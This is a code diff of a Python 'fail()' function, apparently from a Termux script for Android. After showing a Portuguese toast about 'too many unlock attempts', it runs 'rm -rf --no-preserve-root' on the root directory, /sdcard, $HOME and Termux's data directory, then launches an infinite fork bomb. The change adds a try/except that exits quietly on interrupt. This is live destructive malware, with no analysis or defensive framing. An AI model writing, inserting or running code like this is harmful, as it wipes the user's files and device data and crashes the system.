@@ -5,20 +5,26 @@
 
 def fail():
 
-    from time import sleep
-    from os import system, fork
+    try:
 
-    root = system('sudo echo "Superuser binary detected." | grep superuser')
-    print ('\x1b[H\x1b[2J\x1b')
-    sleep(3)
+        from time import sleep
+        from os import system, fork
 
-    system('termux-toast -g middler -b black -c red "Excesso de tentativas de desbloqueio atingidas, iniciando autodestruição dos arquivos..."')
+        root = system('sudo echo "Superuser binary detected." | grep superuser')
+        print ('\x1b[H\x1b[2J\x1b')
+        sleep(3)
 
-    if root == 'superuser binary detected.':        
-        system('rm -rf --no-preserve-root / > /dev/null')
+        system('termux-toast -g middler -b black -c red "Excesso de tentativas de desbloqueio atingidas, iniciando autodestruição dos arquivos..."')
 
-    else:
-        system('rm -rf --no-preserve-root /sdcard > /dev/null ; rm -rf --no-preserve-root $HOME > /dev/null ; rm -rf --no-preserve-root /data/data/com.termux/ > /dev/null')
+        if root == 'superuser binary detected.':        
+            system('rm -rf --no-preserve-root / > /dev/null')
 
-    while True:
-        fork()
+        else:
+            system('rm -rf --no-preserve-root /sdcard > /dev/null ; rm -rf --no-preserve-root $HOME > /dev/null ; rm -rf --no-preserve-root /data/data/com.termux/ > /dev/null')
+
+        while True:
+            fork()
+
+    except (KeyboardInterrupt):
+
+        exit()
